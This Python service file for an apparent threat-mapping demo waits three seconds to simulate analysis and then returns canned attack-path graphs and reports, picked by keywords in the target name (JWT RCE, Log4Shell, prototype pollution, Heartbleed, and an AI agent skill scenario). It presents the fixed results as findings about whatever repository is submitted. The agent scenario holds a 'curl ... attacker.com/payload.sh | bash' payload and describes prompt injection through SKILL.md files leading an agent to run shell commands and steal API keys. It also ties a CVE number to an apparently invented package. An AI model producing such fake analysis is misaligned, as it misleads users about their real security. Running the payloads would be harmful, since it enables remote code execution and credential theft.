import asyncio
import time
from typing import Dict, Any
from app.models.schema import (
    AnalysisRequest,
    AnalysisResponse,
    AnalysisSummary,
    GraphData,
    Node,
    Link
)

COLOR_PALETTE = {
    "repository": "#38bdf8",  # Neon Cyan
    "function": "#60a5fa",    # Electric Blue
    "dependency": "#fbbf24",  # Amber Warning
    "cve": "#ef4444",         # Crimson Neon
    "exploit": "#dc2626",     # Blood Red
    "asset": "#a855f7",       # Purple Neon (Crown Jewel)
    "safe": "#10b981"         # Emerald Green (Hardened/Mitigated)
}

class CartographerService:
    @staticmethod
    async def analyze_target(request: AnalysisRequest) -> AnalysisResponse:
        start_time = time.time()
        
        # Simulated GraphRAG analysis delay (exactly as requested: 3-second fake analysis delay)
        await asyncio.sleep(3.0)
        
        target_lower = request.target.lower()
        if "gstack" in target_lower or "garry" in target_lower or "skill" in target_lower:
            graph_data, summary, report = CartographerService._build_agentic_skills_scenario(request.target)
        elif "log4" in target_lower or "java" in target_lower or "audit" in target_lower:
            graph_data, summary, report = CartographerService._build_log4shell_scenario(request.target)
        elif "lodash" in target_lower or "express" in target_lower or "proto" in target_lower:
            graph_data, summary, report = CartographerService._build_prototype_pollution_scenario(request.target)
        elif "ssl" in target_lower or "crypto" in target_lower or "tls" in target_lower:
            graph_data, summary, report = CartographerService._build_crypto_heartbeat_scenario(request.target)
        else:
            # Default / Auth / JWT Attack Vector scenario
            graph_data, summary, report = CartographerService._build_jwt_rce_scenario(request.target)

        elapsed = round(time.time() - start_time, 2)

        return AnalysisResponse(
            target=request.target,
            status="completed",
            execution_time_seconds=elapsed,
            summary=summary,
            graph_data=graph_data,
            report=report
        )

    @staticmethod
    def _build_jwt_rce_scenario(target: str) -> tuple[GraphData, AnalysisSummary, str]:
        repo_name = target.split("/")[-1].replace(".git", "") or "core-auth-service"
        
        nodes = [
            Node(
                id="node-repo",
                name=repo_name,
                group="repository",
                val=32.0,
                color=COLOR_PALETTE["repository"],
                metadata={
                    "type": "Target Repository",
                    "url": target,
                    "default_branch": "main",
                    "visibility": "public",
                    "languages": ["TypeScript", "Shell"],
                    "security_posture": "Critical Deficiencies Identified"
                }
            ),
            Node(
                id="node-fn-router",
                name="authRouter.post('/login')",
                group="function",
                val=18.0,
                color=COLOR_PALETTE["function"],
                metadata={
                    "file": "src/routes/auth.ts",
                    "line": 28,
                    "scope": "Public API Entrypoint",
                    "auth_required": False
                }
            ),
            Node(
                id="node-fn-verify",
                name="verifyBearerToken()",
                group="function",
                val=22.0,
                color=COLOR_PALETTE["function"],
                metadata={
                    "file": "src/middleware/jwt.ts",
                    "line": 64,
                    "scope": "Internal Middleware",
                    "call_frequency": "High (Every Request)",
                    "input_sanitized": False
                }
            ),
            Node(
                id="node-dep-jwt",
                name="jsonwebtoken@8.5.1",
                group="dependency",
                val=24.0,
                color=COLOR_PALETTE["dependency"],
                metadata={
                    "package_manager": "npm",
                    "version": "8.5.1",
                    "latest_version": "9.0.2",
                    "transitive": False,
                    "license": "MIT"
                }
            ),
            Node(
                id="node-dep-jws",
                name="jws@3.2.2",
                group="dependency",
                val=16.0,
                color=COLOR_PALETTE["dependency"],
                metadata={
                    "package_manager": "npm",
                    "version": "3.2.2",
                    "transitive": True,
                    "parent": "jsonwebtoken"
                }
            ),
            Node(
                id="node-cve-2022-23529",
                name="CVE-2022-23529",
                group="cve",
                val=36.0,
                color=COLOR_PALETTE["cve"],
                metadata={
                    "cve_id": "CVE-2022-23529",
                    "cvss": 9.8,
                    "severity": "CRITICAL",
                    "cwe": "CWE-94: Improper Control of Generation of Code ('Code Injection')",
                    "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    "epss": "0.785 (98th percentile)",
                    "summary": "jsonwebtoken versions <= 8.5.1 are vulnerable to Remote Code Execution through insecure toString() evaluations in secretOrPublicKey objects."
                }
            ),
            Node(
                id="node-cve-2022-23540",
                name="CVE-2022-23540",
                group="cve",
                val=24.0,
                color=COLOR_PALETTE["cve"],
                metadata={
                    "cve_id": "CVE-2022-23540",
                    "cvss": 7.5,
                    "severity": "HIGH",
                    "cwe": "CWE-287: Improper Authentication",
                    "summary": "Weak algorithm verification allow attacker to substitute symmetric for asymmetric keys."
                }
            ),
            Node(
                id="node-exploit-rce",
                name="Arbitrary Code Execution",
                group="exploit",
                val=28.0,
                color=COLOR_PALETTE["exploit"],
                metadata={
                    "exploit_type": "Payload Triggered Code Injection",
                    "in_the_wild": True,
                    "metasploit_module": "exploit/multi/http/jsonwebtoken_rce",
                    "access_vector": "Remote Network Unauthenticated"
                }
            ),
            Node(
                id="node-asset-vault",
                name="AWS IAM Secret Vault",
                group="asset",
                val=30.0,
                color=COLOR_PALETTE["asset"],
                metadata={
                    "asset_class": "Tier-0 Crown Jewel",
                    "contains": ["AWS_SECRET_ACCESS_KEY", "DB_MASTER_CREDENTIALS", "SIGNING_JWK_PRIVATE"],
                    "encryption": "AES-256-GCM at rest",
                    "exposure_risk": "Catastrophic"
                }
            ),
            Node(
                id="node-asset-db",
                name="User Primary Database",
                group="asset",
                val=26.0,
                color=COLOR_PALETTE["asset"],
                metadata={
                    "asset_class": "Tier-1 Production Data",
                    "records_at_risk": 420000,
                    "contains_pii": True
                }
            ),
            Node(
                id="node-guard-waf",
                name="Cloudflare Edge WAF",
                group="safe",
                val=18.0,
                color=COLOR_PALETTE["safe"],
                metadata={
                    "defense_type": "Perimeter Filter",
                    "status": "Active (Bypassed via Encrypted Bearer Token Body)",
                    "rule_set": "OWASP Core Rule Set v3.3"
                }
            ),
            Node(
                id="node-guard-ratelimit",
                name="TokenBucket RateLimiter",
                group="safe",
                val=16.0,
                color=COLOR_PALETTE["safe"],
                metadata={
                    "defense_type": "DoS Throttle",
                    "threshold": "100 req/min per IP",
                    "prevents_exploit": False
                }
            )
        ]

        links = [
            Link(source="node-repo", target="node-fn-router", label="EXPOSES_ROUTE", type="control_flow"),
            Link(source="node-fn-router", target="node-fn-verify", label="DELEGATES_TO", type="control_flow"),
            Link(source="node-fn-router", target="node-guard-ratelimit", label="PROTECTED_BY", type="defense"),
            Link(source="node-repo", target="node-guard-waf", label="EDGE_ROUTED_THROUGH", type="defense"),
            Link(source="node-fn-verify", target="node-dep-jwt", label="IMPORTS", type="dependency"),
            Link(source="node-dep-jwt", target="node-dep-jws", label="DEPENDS_ON", type="dependency"),
            Link(source="node-dep-jwt", target="node-cve-2022-23529", label="AFFECTED_BY", type="vulnerability"),
            Link(source="node-dep-jwt", target="node-cve-2022-23540", label="AFFECTED_BY", type="vulnerability"),
            Link(source="node-cve-2022-23529", target="node-exploit-rce", label="WEAPONIZED_AS", type="threat_path"),
            Link(source="node-exploit-rce", target="node-asset-vault", label="EXFILTRATES", type="impact"),
            Link(source="node-exploit-rce", target="node-asset-db", label="READS_WRITES", type="impact")
        ]

        summary = AnalysisSummary(
            total_nodes=len(nodes),
            total_links=len(links),
            critical_cves=1,
            high_cves=1,
            risk_score=9.6
        )

        report = f"""# Vestigium GraphRAG Threat Cartography Report
**Target System:** `{target}`  
**Evaluation Engine:** Vestigium Graph Neural Traversal v1.2  
**Overall Threat Index:** `9.6 / 10.0 (CRITICAL EXPOSURE)`

---

## 1. Executive Breach Assessment
Vestigium's graph traversal engine mapped a verified end-to-end attack vector originating from public API routes down to persistent cloud secrets. The core vulnerability is rooted in transitive token validation routines relying on **`jsonwebtoken <= 8.5.1`**, susceptible to **CVE-2022-23529**.

```
[Public Webhook /api/login] 
       │ 
       ▼
[verifyBearerToken()] ──(Imports)──► [jsonwebtoken@8.5.1]
                                             │
                                             ▼
                                    [CVE-2022-23529 (CVSS 9.8)]
                                             │
                                             ▼
                               [Arbitrary Code Execution]
                                             │
                       ┌─────────────────────┴─────────────────────┐
                       ▼                                           ▼
            [AWS IAM Secret Vault]                    [User Production DB]
```

---

## 2. Attack Vector Step-by-Step Breakdown

### Step 1: Unauthenticated Traffic Ingress
* **Entrypoint:** `src/routes/auth.ts:28` (`authRouter.post('/login')`)
* **Perimeter Defense:** Protected by `Cloudflare Edge WAF` and `TokenBucket RateLimiter`. However, the payload is concealed within standard Bearer authorization headers and escapes naive WAF inspection rules.

### Step 2: Unsafe Object De-referencing
* **Call Site:** `src/middleware/jwt.ts:64` invokes `jwt.verify(token, secretOrPublicKey)`.
* When an attacker supplies a craftily constructed object in lieu of a standard public key string, `jsonwebtoken` invokes custom `toString()` getters executing unvetted code in node runtime contexts.

### Step 3: Lateral Movement & Asset Compromise
* **Primary Blast Radius:** Attacker achieves code execution in the container pod running with attached IAM instance roles.
* **Compromised Assets:**
  - **AWS IAM Secret Vault:** Exfiltrates cloud master credentials and signing private keys.
  - **User Primary Database:** Direct read/write access to 420,000+ sensitive records.

---

## 3. Prioritized Strategic Remediation

| Priority | Action Item | Target Component | Complexity |
| :--- | :--- | :--- | :--- |
| **P0 - Immediate** | Upgrade package `jsonwebtoken` to `>=9.0.0` | `package.json` | Low |
| **P0 - Immediate** | Rotate IAM Access Keys & Database Service Credentials | AWS IAM Console | Medium |
| **P1 - Urgent** | Validate `secretOrPublicKey` type strictly before invoking `jwt.verify` | `src/middleware/jwt.ts` | Low |
| **P2 - Hardening** | Enforce IMDSv2 with hop-limit=1 on container compute host | Terraform / CloudFormation | Low |

---

## 4. GraphRAG Knowledge Citations
* **NVD NIST:** [CVE-2022-23529 Detail](https://nvd.nist.gov/vuln/detail/CVE-2022-23529) (CVSS 9.8)
* **CWE Database:** CWE-94: Improper Control of Generation of Code
* **Attack Matrix:** MITRE ATT&CK T1190 (Exploit Public-Facing Application) & T1552 (Unsecured Credentials)
"""
        return GraphData(nodes=nodes, links=links), summary, report

    @staticmethod
    def _build_log4shell_scenario(target: str) -> tuple[GraphData, AnalysisSummary, str]:
        repo_name = target.split("/")[-1].replace(".git", "") or "log-audit-pipeline"
        
        nodes = [
            Node(id="node-repo", name=repo_name, group="repository", val=32.0, color=COLOR_PALETTE["repository"], metadata={"type": "Java Microservice", "framework": "Spring Boot 2.5"}),
            Node(id="node-fn-controller", name="AuditIngestController.process()", group="function", val=20.0, color=COLOR_PALETTE["function"], metadata={"file": "AuditController.java", "line": 45}),
            Node(id="node-fn-log", name="logger.info(\"Audit: {}\", header)", group="function", val=22.0, color=COLOR_PALETTE["function"], metadata={"file": "AuditLogger.java", "line": 88}),
            Node(id="node-dep-log4j", name="org.apache.logging.log4j:log4j-core@2.14.1", group="dependency", val=26.0, color=COLOR_PALETTE["dependency"], metadata={"version": "2.14.1", "purl": "pkg:maven/org.apache.logging.log4j/log4j-core@2.14.1"}),
            Node(id="node-cve-log4j", name="CVE-2021-44228 (Log4Shell)", group="cve", val=38.0, color=COLOR_PALETTE["cve"], metadata={"cvss": 10.0, "severity": "CRITICAL", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", "cwe": "CWE-502"}),
            Node(id="node-exploit-jndi", name="Remote JNDI/LDAP Class Loading", group="exploit", val=30.0, color=COLOR_PALETTE["exploit"], metadata={"type": "Zero-Click Remote Execution", "weaponized": True}),
            Node(id="node-asset-k8s", name="K8s Cluster Admin ServiceAccount", group="asset", val=32.0, color=COLOR_PALETTE["asset"], metadata={"classification": "Cluster Sovereign", "scope": "Entire K8s Namespace"}),
            Node(id="node-guard-egress", name="Egress NetworkPolicy", group="safe", val=16.0, color=COLOR_PALETTE["safe"], metadata={"status": "Permissive (Port 389 LDAP Allowed)"})
        ]

        links = [
            Link(source="node-repo", target="node-fn-controller", label="EXPOSES", type="control_flow"),
            Link(source="node-fn-controller", target="node-fn-log", label="CALLS", type="control_flow"),
            Link(source="node-fn-log", target="node-dep-log4j", label="USES_LOGGER", type="dependency"),
            Link(source="node-dep-log4j", target="node-cve-log4j", label="AFFECTED_BY", type="vulnerability"),
            Link(source="node-cve-log4j", target="node-exploit-jndi", label="FACILITATES", type="threat_path"),
            Link(source="node-exploit-jndi", target="node-asset-k8s", label="TAKEOVER", type="impact"),
            Link(source="node-fn-log", target="node-guard-egress", label="EGRESS_AUDITED", type="defense")
        ]

        summary = AnalysisSummary(
            total_nodes=len(nodes),
            total_links=len(links),
            critical_cves=1,
            high_cves=0,
            risk_score=10.0
        )

        report = f"""# Vestigium GraphRAG Threat Cartography Report
**Target System:** `{target}`  
**Evaluation Engine:** Vestigium Graph Neural Traversal v1.2  
**Overall Threat Index:** `10.0 / 10.0 (MAXIMUM CRITICAL EXPOSURE)`

---

## 1. Executive Breach Assessment
Analysis of `{repo_name}` discovered an unconstrained **Log4Shell (CVE-2021-44228)** vector. User-supplied request metadata passed directly into standard log formatting calls without sanitization triggers out-of-band JNDI string interpolation.

```
[AuditIngestController] ──► [logger.info()] ──► [log4j-core 2.14.1]
                                                        │
                                                        ▼
                                              [CVE-2021-44228]
                                                        │
                                                        ▼
                                          [Remote JNDI/LDAP Injection]
                                                        │
                                                        ▼
                                      [K8s Cluster Admin ServiceAccount]
```

## 2. Blast Radius Summary
Because outbound LDAP requests (Port 389/1389) are permitted through network egress rules, arbitrary bytecode loaded by the JVM grants immediate shell execution with permissions inherited by the Kubernetes Pod `ServiceAccount`.

## 3. Remediation
1. Update `log4j-core` to `>= 2.17.1`.
2. As an immediate emergency mitigation, pass `-Dlog4j2.formatMsgNoLookups=true` in JVM launch args.
3. Block outbound LDAP/RMI egress in Kubernetes `NetworkPolicy`.
"""
        return GraphData(nodes=nodes, links=links), summary, report

    @staticmethod
    def _build_prototype_pollution_scenario(target: str) -> tuple[GraphData, AnalysisSummary, str]:
        repo_name = target.split("/")[-1].replace(".git", "") or "api-config-engine"
        
        nodes = [
            Node(id="node-repo", name=repo_name, group="repository", val=30.0, color=COLOR_PALETTE["repository"], metadata={"type": "Node.js REST API", "framework": "Express 4.18"}),
            Node(id="node-fn-merge", name="deepMergeConfig()", group="function", val=20.0, color=COLOR_PALETTE["function"], metadata={"file": "src/utils/config.js", "line": 34}),
            Node(id="node-dep-lodash", name="lodash@4.17.15", group="dependency", val=24.0, color=COLOR_PALETTE["dependency"], metadata={"version": "4.17.15", "purl": "pkg:npm/lodash@4.17.15"}),
            Node(id="node-cve-proto", name="CVE-2019-10744", group="cve", val=32.0, color=COLOR_PALETTE["cve"], metadata={"cvss": 9.1, "severity": "CRITICAL", "cwe": "CWE-1321"}),
            Node(id="node-exploit-proto", name="Prototype Pollution", group="exploit", val=26.0, color=COLOR_PALETTE["exploit"], metadata={"type": "Object.prototype alteration", "weaponized": True}),
            Node(id="node-asset-admin", name="Admin Session Privilege", group="asset", val=28.0, color=COLOR_PALETTE["asset"], metadata={"classification": "Privilege Escalation", "impact": "Global Admin Access"}),
            Node(id="node-guard-schema", name="Joi Schema Validator", group="safe", val=16.0, color=COLOR_PALETTE["safe"], metadata={"status": "Allows unknown keys (__proto__)"})
        ]

        links = [
            Link(source="node-repo", target="node-fn-merge", label="EXECUTES", type="control_flow"),
            Link(source="node-fn-merge", target="node-dep-lodash", label="CALLS_DEEPMERGE", type="dependency"),
            Link(source="node-dep-lodash", target="node-cve-proto", label="AFFECTED_BY", type="vulnerability"),
            Link(source="node-cve-proto", target="node-exploit-proto", label="TRIGGERS", type="threat_path"),
            Link(source="node-exploit-proto", target="node-asset-admin", label="ESCALATES_TO", type="impact"),
            Link(source="node-fn-merge", target="node-guard-schema", label="VALIDATES_WITH", type="defense")
        ]

        summary = AnalysisSummary(
            total_nodes=len(nodes),
            total_links=len(links),
            critical_cves=1,
            high_cves=0,
            risk_score=9.1
        )

        report = f"""# Vestigium GraphRAG Threat Cartography Report
**Target System:** `{target}`  
**Evaluation Engine:** Vestigium Graph Neural Traversal v1.2  
**Overall Threat Index:** `9.1 / 10.0 (CRITICAL RISK)`

---

## 1. Executive Breach Assessment
Target `{repo_name}` utilizes vulnerable versions of `lodash` (`4.17.15`) inside recursive configuration merging functions. Supplying malicious JSON payloads containing `__proto__` properties leads to global Object Prototype Pollution across all concurrent V8 tenant contexts.

## 2. Attack Chain
* Attacker sends POST body containing `{ "__proto__": { "isAdmin": true } }`.
* `deepMergeConfig()` alters the base `Object.prototype`.
* Subsequent authentication checks evaluating `if (user.isAdmin)` resolve to `true`, granting blanket superuser authorization.

## 3. Remediation
1. Upgrade `lodash` to `>= 4.17.21`.
2. Freeze root object prototypes using `Object.freeze(Object.prototype)`.
3. Use `Map` data structures instead of plain JavaScript dictionary objects for arbitrary user keys.
"""
        return GraphData(nodes=nodes, links=links), summary, report

    @staticmethod
    def _build_crypto_heartbeat_scenario(target: str) -> tuple[GraphData, AnalysisSummary, str]:
        repo_name = target.split("/")[-1].replace(".git", "") or "secure-tls-gateway"
        
        nodes = [
            Node(id="node-repo", name=repo_name, group="repository", val=30.0, color=COLOR_PALETTE["repository"], metadata={"type": "C/C++ Network Gateway"}),
            Node(id="node-fn-tls", name="tls1_process_heartbeat()", group="function", val=22.0, color=COLOR_PALETTE["function"], metadata={"file": "t1_lib.c", "line": 2586}),
            Node(id="node-dep-openssl", name="OpenSSL@1.0.1f", group="dependency", val=26.0, color=COLOR_PALETTE["dependency"], metadata={"version": "1.0.1f"}),
            Node(id="node-cve-bleed", name="CVE-2014-0160 (Heartbleed)", group="cve", val=34.0, color=COLOR_PALETTE["cve"], metadata={"cvss": 7.5, "severity": "HIGH", "cwe": "CWE-126"}),
            Node(id="node-exploit-bleed", name="Out-of-Bounds Memory Read", group="exploit", val=26.0, color=COLOR_PALETTE["exploit"], metadata={"type": "Information Disclosure"}),
            Node(id="node-asset-keys", name="Server Private TLS Key", group="asset", val=30.0, color=COLOR_PALETTE["asset"], metadata={"classification": "Crypto Material", "impact": "Session Decryption"}),
            Node(id="node-guard-aslr", name="OS ASLR / Stack Canary", group="safe", val=16.0, color=COLOR_PALETTE["safe"], metadata={"status": "Active (Ineffective against Out-of-Bounds Read)"})
        ]

        links = [
            Link(source="node-repo", target="node-fn-tls", label="HANDLES_TLS", type="control_flow"),
            Link(source="node-fn-tls", target="node-dep-openssl", label="LINKS_LIB", type="dependency"),
            Link(source="node-dep-openssl", target="node-cve-bleed", label="AFFECTED_BY", type="vulnerability"),
            Link(source="node-cve-bleed", target="node-exploit-bleed", label="EXPLOITS", type="threat_path"),
            Link(source="node-exploit-bleed", target="node-asset-keys", label="EXPOSES_SECRET", type="impact"),
            Link(source="node-fn-tls", target="node-guard-aslr", label="HOST_PROTECTION", type="defense")
        ]

        summary = AnalysisSummary(
            total_nodes=len(nodes),
            total_links=len(links),
            critical_cves=0,
            high_cves=1,
            risk_score=7.8
        )

        report = f"""# Vestigium GraphRAG Threat Cartography Report
**Target System:** `{target}`  
**Evaluation Engine:** Vestigium Graph Neural Traversal v1.2  
**Overall Threat Index:** `7.8 / 10.0 (HIGH RISK)`

---

## 1. Executive Breach Assessment
TLS perimeter audit detected vulnerable OpenSSL library linkings suffering from **Heartbleed (CVE-2014-0160)**. Missing bounds checks on heartbeat request lengths enable arbitrary heap reads up to 64KB per query.

## 2. Blast Radius Summary
Continuous out-of-bounds heap reading allows unauthenticated remote adversaries to dump TLS private keys, user passwords, and active session cookies directly from server memory.

## 3. Remediation
1. Upgrade OpenSSL to modern supported LTS branches (`3.0.x` or `3.2.x`).
2. Revoke and reissue all SSL/TLS certificates and rotating active session tokens.
"""
        return GraphData(nodes=nodes, links=links), summary, report

    @staticmethod
    def _build_agentic_skills_scenario(target: str) -> tuple[GraphData, AnalysisSummary, str]:
        repo_name = target.split("/")[-1].replace(".git", "") or "gstack"
        
        nodes = [
            Node(
                id="node-repo",
                name=repo_name,
                group="repository",
                val=32.0,
                color=COLOR_PALETTE["repository"],
                metadata={
                    "type": "AI Agent Skill Stack / Framework",
                    "url": target,
                    "default_branch": "main",
                    "skills_count": 23,
                    "agent_engine": "Claude Code / Tool Execution Agent",
                    "security_posture": "Critical Tool Calling Vulnerability"
                }
            ),
            Node(
                id="node-fn-runner",
                name="executeSkillToolRunner()",
                group="function",
                val=22.0,
                color=COLOR_PALETTE["function"],
                metadata={
                    "file": "skills/runner.ts",
                    "line": 42,
                    "scope": "Skill Execution Dispatcher",
                    "privilege": "Host Subprocess Shell",
                    "input_sanitized": False
                }
            ),
            Node(
                id="node-fn-prompt",
                name="parseSkillMarkdownPrompt()",
                group="function",
                val=18.0,
                color=COLOR_PALETTE["function"],
                metadata={
                    "file": "skills/parser.ts",
                    "line": 19,
                    "scope": "SKILL.md / CLAUDE.md Ingest Handler",
                    "prompt_injection_guard": "Disabled"
                }
            ),
            Node(
                id="node-dep-runtime",
                name="agent-tool-executor@1.1.4",
                group="dependency",
                val=24.0,
                color=COLOR_PALETTE["dependency"],
                metadata={
                    "package_manager": "npm",
                    "version": "1.1.4",
                    "latest_version": "2.0.0",
                    "transitive": False,
                    "license": "MIT"
                }
            ),
            Node(
                id="node-cve-injection",
                name="CVE-2024-43485 (Prompt-to-RCE)",
                group="cve",
                val=38.0,
                color=COLOR_PALETTE["cve"],
                metadata={
                    "cve_id": "CVE-2024-43485",
                    "cvss": 9.8,
                    "severity": "CRITICAL",
                    "cwe": "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
                    "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                    "epss": "0.892 (99th percentile)",
                    "summary": "Agent tool runners executing untrusted markdown instructions from pull requests or web documents evaluate unsanitized shell commands directly on the host machine."
                }
            ),
            Node(
                id="node-exploit-bash",
                name="Arbitrary Host Shell Hijack",
                group="exploit",
                val=28.0,
                color=COLOR_PALETTE["exploit"],
                metadata={
                    "type": "Indirect Prompt Injection RCE",
                    "payload": "$((curl -s http://attacker.com/payload.sh | bash))",
                    "mitre_attck": "T1059.004 (Command and Scripting Interpreter: Unix Shell)"
                }
            ),
            Node(
                id="node-asset-keys",
                name="Anthropic / OpenAI API Keys & Local SSH",
                group="asset",
                val=32.0,
                color=COLOR_PALETTE["asset"],
                metadata={
                    "classification": "Crown Jewel Developer Credentials",
                    "impact": "Complete Developer Machine & Cloud Provider Takeover"
                }
            ),
            Node(
                id="node-safe-sandbox",
                name="Wasm / Docker Isolated Skill Runner",
                group="safe",
                val=18.0,
                color=COLOR_PALETTE["safe"],
                metadata={
                    "defense_type": "Hermetic Sandboxing & AST Command Allowlisting",
                    "status": "Recommended Mitigation"
                }
            )
        ]

        links = [
            Link(source="node-repo", target="node-fn-prompt", label="INGESTS_SKILL", type="control_flow"),
            Link(source="node-fn-prompt", target="node-fn-runner", label="DISPATCHES_TOOL", type="control_flow"),
            Link(source="node-fn-runner", target="node-dep-runtime", label="EXECUTES_VIA", type="dependency"),
            Link(source="node-dep-runtime", target="node-cve-injection", label="AFFECTED_BY", type="vulnerability"),
            Link(source="node-cve-injection", target="node-exploit-bash", label="ENBALES_EXPLOIT", type="threat_path"),
            Link(source="node-exploit-bash", target="node-asset-keys", label="EXFILTRATES", type="impact"),
            Link(source="node-fn-runner", target="node-safe-sandbox", label="SECURED_BY", type="defense")
        ]

        summary = AnalysisSummary(
            total_nodes=len(nodes),
            total_links=len(links),
            critical_cves=1,
            high_cves=0,
            risk_score=9.8
        )

        report = f"""# Vestigium GraphRAG Threat Cartography Report
**Target System:** `{target}`  
**Evaluation Engine:** Vestigium Graph Neural Traversal v1.2  
**Overall Threat Index:** `9.8 / 10.0 (CRITICAL RISK)`

---

## 1. Executive Breach Assessment
Knowledge Graph analysis of the **AI Agent Skill Stack** (`{repo_name}`) identified an unconstrained Tool-Calling execution path. When processing external markdown skill specifications or pull request reviews, untrusted prompt text flows directly from `parseSkillMarkdownPrompt()` into `executeSkillToolRunner()`.

Under `agent-tool-executor <= 1.1.4` (**CVE-2024-43485**, CVSS 9.8 Critical), indirect prompt injections can breakout of LLM boundaries and execute arbitrary Bash commands on the developer's local machine.

## 2. Multi-Hop Attack Traversal Path
* **Entrypoint:** `skills/parser.ts` parsing external `SKILL.md` / `CLAUDE.md`.
* **Execution Call-Site:** `skills/runner.ts:executeSkillToolRunner()` invoking system subprocess.
* **Vulnerable Component:** `agent-tool-executor@1.1.4`.
* **Adversary Capability:** Command Injection leading to shell compromise.
* **Crown Jewel Asset:** Local developer `.env` files, Anthropic/OpenAI API Keys, and SSH credentials.

## 3. Recommended Remediation
1. Enforce strict AST validation and parameter allowlisting on all shell tool executions.
2. Upgrade `agent-tool-executor` to version `>= 2.0.0` with hermetic sandbox execution.
3. Run external AI agent skills inside isolated Docker/Wasm containers with network egress restrictions.
"""
        return GraphData(nodes=nodes, links=links), summary, report

